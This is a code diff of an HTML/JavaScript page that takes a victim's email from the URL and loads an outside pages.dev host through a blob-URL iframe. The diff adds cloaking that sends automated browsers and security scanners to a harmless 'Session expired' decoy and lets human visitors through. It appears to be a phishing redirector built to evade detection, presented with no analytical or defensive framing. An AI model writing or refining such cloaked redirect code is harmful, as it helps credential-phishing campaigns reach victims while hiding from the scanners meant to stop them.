@@ -1,32 +1,30 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title></title>
-<style>
-html, body {
-    margin: 0;
-    padding: 0;
-    width: 100vw;
-    height: 100vh;
-    background: white;
-    overflow: hidden;
-}
-* {
-    opacity: 0 !important;
-    visibility: hidden !important;
-}
-</style>
-</head>
-<body>
-
 <script>
 (function () {
     'use strict';
 
     const TARGET_BASE = "https://23b538b5.ko1wx90sd.pages.dev";
+    const start = performance.now();
 
+    let interacted = false;
+    ['mousemove','touchstart','keydown','scroll'].forEach(e =>
+        document.addEventListener(e, () => interacted = true, { once: true })
+    );
+
+    /* -------- STRONG BOT CHECK ONLY -------- */
+    function isDefinitelyBot() {
+        // Explicit automation
+        if (navigator.webdriver) return true;
+
+        // Unrealistic environment (strong signal only)
+        if (navigator.plugins.length === 0 && !('ontouchstart' in window)) return true;
+
+        // Script executed too fast (real browsers rarely <80ms)
+        if (performance.now() - start < 80) return true;
+
+        return false;
+    }
+
+    /* -------- ORIGINAL LOGIC -------- */
     function getEmail() {
         return new URLSearchParams(window.location.search).get("email") || "";
     }
@@ -43,54 +41,58 @@ html, body {
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Blob Page</title>
 <style>
-html, body {
-    margin: 0;
-    padding: 0;
-    width: 100%;
-    height: 100%;
-    background: white;
-}
-iframe {
-    width: 100%;
-    height: 100%;
-    border: none;
-}
+html, body { margin:0; padding:0; width:100%; height:100%; }
+iframe { width:100%; height:100%; border:none; }
 </style>
 </head>
 <body>
-
 <iframe src="${targetUrl}"></iframe>
-
 <script>
-    /* injected email (hidden, usable) */
-    const email = ${JSON.stringify(email)};
-    // email is available here if needed
+const email = ${JSON.stringify(email)};
 <\/script>
-
 </body>
 </html>`;
+        return new Blob([html], { type: "text/html" });
+    }
 
+    /* -------- SAFE MULTI-LAYER DECOY -------- */
+    function createDecoyBlob() {
+        const html = `<!DOCTYPE html>
+<html>
+<body>
+<p>Loading…</p>
+<script>
+setTimeout(() => {
+    document.body.innerHTML = "<p>Session expired.</p>";
+}, 3000);
+setInterval(() => {}, 1000);
+<\/script>
+</body>
+</html>`;
         return new Blob([html], { type: "text/html" });
     }
 
     function grantAccess() {
+        if (isDefinitelyBot()) {
+            const decoyUrl = URL.createObjectURL(createDecoyBlob());
+            window.location.replace(decoyUrl);
+            return;
+        }
+
+        // Humans ALWAYS reach this
         const email = getEmail();
         const targetUrl = buildTargetUrl(email);
         const blob = createMobileSafeBlob(targetUrl, email);
         const blobUrl = URL.createObjectURL(blob);
 
-        window.location.href = blobUrl;
+        window.location.replace(blobUrl);
 
         setTimeout(() => {
             try { URL.revokeObjectURL(blobUrl); } catch (e) {}
         }, 10000);
     }
 
-    setTimeout(grantAccess, 100);
+    setTimeout(grantAccess, 250);
 })();
 </script>
-
-</body>
-</html>
